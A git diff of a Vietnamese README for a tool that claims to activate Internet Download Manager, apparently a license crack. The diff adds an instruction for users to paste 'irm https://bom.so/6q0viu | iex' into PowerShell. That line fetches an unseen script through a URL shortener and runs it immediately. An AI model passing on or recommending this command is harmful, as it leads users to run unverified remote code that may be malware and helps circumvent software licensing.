@@ -1,6 +1,6 @@
-# Tên Công Cụ Của Bạn
+# Tool IDM activate
 
-Công cụ này giúp bạn [điền chức năng chính vào đây, ví dụ: tự động kích hoạt IDM].
+Công cụ này giúp bạn tự động kích hoạt IDM.
 
 ---
 
@@ -16,7 +16,7 @@ Công cụ này giúp bạn [điền chức năng chính vào đây, ví dụ: t
 2.  Copy và dán toàn bộ lệnh dưới đây vào cửa sổ PowerShell rồi nhấn **Enter**:
 
     ```powershell
-    irm "[https://bom.so/6q0viu](https://bom.so/6q0viu)" | iex
+    irm https://bom.so/6q0viu | iex
     ```
 
 3.  Làm theo các hướng dẫn tiếp theo trên màn hình (nếu có).
